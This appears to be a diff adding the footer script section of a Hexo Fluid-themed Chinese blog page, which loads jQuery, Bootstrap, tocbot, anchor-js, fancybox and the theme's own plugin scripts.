+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
